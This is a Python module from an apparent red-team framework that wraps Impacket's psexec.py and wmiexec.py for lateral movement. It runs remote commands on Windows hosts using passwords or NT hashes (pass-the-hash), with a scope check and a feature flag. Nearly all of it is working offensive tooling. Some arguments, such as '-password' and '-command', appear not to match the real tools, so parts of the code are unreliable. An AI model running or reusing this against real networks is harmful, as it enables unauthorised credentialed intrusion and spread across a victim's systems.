"""
Operational Lateral Movement (Lab-only, scope-gated)

Implements wrappers for common LM techniques using Impacket tools:
- psexec.py (SMB-based service exec)
- wmiexec.py (WMI-based remote command exec)

Safety:
- Enforces lab scope for each target before execution
- Requires feature flag: features.enable_lateral_movement
- Does NOT embed payloads; executes operator-provided commands only

Requirements:
- Impacket installed and accessible via PATH (psexec.py, wmiexec.py) or configured in tools.impacket_scripts_dir

Usage (programmatic):
    from prometheus_prime.config_loader import load_config, load_scope
    from prometheus_prime.capabilities.lateral_movement import run_psexec, run_wmiexec

    cfg = load_config()
    scope = load_scope(cfg)

    result = run_psexec(
        cfg=cfg,
        scope_doc=scope,
        target="10.0.0.10",
        username="LAB\\user",
        password="Passw0rd!",
        command="whoami && hostname"
    )

Reports:
- Writes Markdown/JSON reports under reports/lateral/ if reporting enabled
"""

from __future__ import annotations

import json
import logging
import os
import shutil
import subprocess
from pathlib import Path
from typing import Any, Dict, Optional

from scope_gate import enforce_scope, ScopeViolation
from reporting_engine import write_report

log = logging.getLogger("PROMETHEUS-PRIME.LateralMovement")


def _resolve_impacket_script(cfg: Dict[str, Any], script_name: str) -> str:
    """
    Resolve impacket tool path by:
      1) tools.impacket_scripts_dir if provided (join with script_name)
      2) PATH lookup (script_name)
    """
    scripts_dir = (cfg.get("tools", {}) or {}).get("impacket_scripts_dir") or ""
    if scripts_dir:
        candidate = Path(scripts_dir).joinpath(script_name)
        if candidate.exists():
            return str(candidate)
    # Try PATH
    tool = shutil.which(script_name)
    if tool:
        return tool
    raise FileNotFoundError(
        f"{script_name} not found. Configure tools.impacket_scripts_dir or ensure the script is on PATH."
    )


def _reports_dir(cfg: Dict[str, Any], subfolder: str = "lateral") -> Path:
    base = (cfg.get("paths", {}) or {}).get("reports_dir", "reports")
    p = Path(__file__).resolve().parents[1].joinpath(base).joinpath(subfolder).resolve()
    p.mkdir(parents=True, exist_ok=True)
    return p


def _maybe_write_report(cfg: Dict[str, Any], title: str, summary: Dict[str, Any]) -> Optional[Path]:
    if not (cfg.get("features", {}) or {}).get("enable_reporting", True):
        return None
    fmt = (cfg.get("reporting", {}) or {}).get("default_format", "markdown")
    return write_report(
        reports_dir=str(_reports_dir(cfg)),
        title=title,
        summary=summary,
        format=fmt,
    )


def _run_subprocess(cmd: list[str]) -> Dict[str, Any]:
    log.info("Executing: %s", " ".join(cmd))
    proc = subprocess.run(cmd, capture_output=True, text=True)
    return {
        "returncode": proc.returncode,
        "stdout": proc.stdout,
        "stderr": proc.stderr,
    }


def run_psexec(
    cfg: Dict[str, Any],
    scope_doc: Dict[str, Any],
    target: str,
    username: str,
    password: Optional[str] = None,
    hash_nt: Optional[str] = None,
    command: str = "cmd.exe",
    share: str = "ADMIN$",
    port: int = 445,
    options: Optional[list[str]] = None,
) -> Dict[str, Any]:
    """
    Execute a remote command via Impacket psexec.py

    Args:
      username: may include domain (e.g., 'LAB\\user' or 'LAB/user')
      password: cleartext password (optional if hash_nt provided)
      hash_nt: NT hash for pass-the-hash (format: :HASH or full LM:NT; usually supply just NT and prefix ':')
      command: command to execute remotely
      share: remote share for service install
      port: SMB port (default 445)
      options: extra args to pass to psexec.py (e.g., ['-codec', 'utf-8'])

    Returns:
      {
        "tool": "psexec.py",
        "command": [...],
        "target": target,
        "returncode": int,
        "stdout": "...",
        "stderr": "...",
        "report": "path or None"
      }
    """
    # Scope enforcement
    enforce_scope(scope_doc, target, port=port, protocol="tcp")

    if not (cfg.get("features", {}) or {}).get("enable_lateral_movement"):
        raise PermissionError("Lateral Movement feature is disabled in config.features.")

    tool = _resolve_impacket_script(cfg, "psexec.py")

    # Build credentials spec
    user = username.replace("/", "\\")
    auth: list[str] = []
    if hash_nt:
        # Impacket psexec accepts -hashes LMHASH:NTHASH, provide LM as 'aad3b435b51404eeaad3b435b51404ee' if unknown
        lm = "aad3b435b51404eeaad3b435b51404ee"
        nth = hash_nt.lstrip(":")
        auth = ["-hashes", f"{lm}:{nth}"]
        secret = nth
    elif password:
        auth = ["-password", password]
        secret = "******"  # redacted
    else:
        raise ValueError("Either password or hash_nt must be provided for psexec.")

    cmd = [
        tool,
        f"{user}@{target}",
        "-port", str(port),
        "-share", share,
        "-debug",
    ] + auth

    # Extra options
    if options:
        cmd += list(options)

    cmd += [command]

    out = _run_subprocess(cmd)

    summary = {
        "operation": "Lateral Movement - psexec",
        "targets": [target],
        "findings": {
            "tool": "psexec.py",
            "returncode": out["returncode"],
            "stdout_snippet": out["stdout"][:2000],
            "stderr_snippet": out["stderr"][:2000],
        },
        "notes": [
            f"Username: {user}",
            f"Auth: {'NT-Hash' if hash_nt else 'Password'}",
            f"Port: {port}",
            f"Share: {share}",
            f"Command: {command}",
        ],
    }
    report = _maybe_write_report(cfg, title="Lateral Movement - psexec", summary=summary)

    result = {
        "tool": "psexec.py",
        "command": cmd,
        "target": target,
        **out,
        "report": str(report) if report else None,
    }
    return result


def run_wmiexec(
    cfg: Dict[str, Any],
    scope_doc: Dict[str, Any],
    target: str,
    username: str,
    password: Optional[str] = None,
    hash_nt: Optional[str] = None,
    command: str = "whoami",
    share: Optional[str] = None,
    options: Optional[list[str]] = None,
) -> Dict[str, Any]:
    """
    Execute a remote command via Impacket wmiexec.py

    Args:
      username: may include domain (e.g., 'LAB\\user' or 'LAB/user')
      password: cleartext password (optional if hash_nt provided)
      hash_nt: NT hash for pass-the-hash (prefix ':' accepted)
      command: command to execute remotely
      share: optional share used by wmiexec (-share)
      options: extra args to pass to wmiexec.py

    Returns:
      {
        "tool": "wmiexec.py",
        "command": [...],
        "target": target,
        "returncode": int,
        "stdout": "...",
        "stderr": "...",
        "report": "path or None"
      }
    """
    # WMI uses DCOM (TCP/135 + high ports), but we validate target only (port-level gating not exact)
    enforce_scope(scope_doc, target, protocol="tcp")

    if not (cfg.get("features", {}) or {}).get("enable_lateral_movement"):
        raise PermissionError("Lateral Movement feature is disabled in config.features.")

    tool = _resolve_impacket_script(cfg, "wmiexec.py")

    user = username.replace("/", "\\")
    auth: list[str] = []
    if hash_nt:
        lm = "aad3b435b51404eeaad3b435b51404ee"
        nth = hash_nt.lstrip(":")
        auth = ["-hashes", f"{lm}:{nth}"]
    elif password:
        auth = ["-password", password]
    else:
        raise ValueError("Either password or hash_nt must be provided for wmiexec.")

    cmd = [
        tool,
        f"{user}@{target}",
        "-debug",
    ] + auth

    if share:
        cmd += ["-share", share]

    if options:
        cmd += list(options)

    cmd += ["-command", command]

    out = _run_subprocess(cmd)

    summary = {
        "operation": "Lateral Movement - wmiexec",
        "targets": [target],
        "findings": {
            "tool": "wmiexec.py",
            "returncode": out["returncode"],
            "stdout_snippet": out["stdout"][:2000],
            "stderr_snippet": out["stderr"][:2000],
        },
        "notes": [
            f"Username: {user}",
            f"Auth: {'NT-Hash' if hash_nt else 'Password'}",
            f"Command: {command}",
            f"Share: {share or '(default)'}",
        ],
    }
    report = _maybe_write_report(cfg, title="Lateral Movement - wmiexec", summary=summary)

    result = {
        "tool": "wmiexec.py",
        "command": cmd,
        "target": target,
        **out,
        "report": str(report) if report else None,
    }
    return result


__all__ = ["run_psexec", "run_wmiexec"]
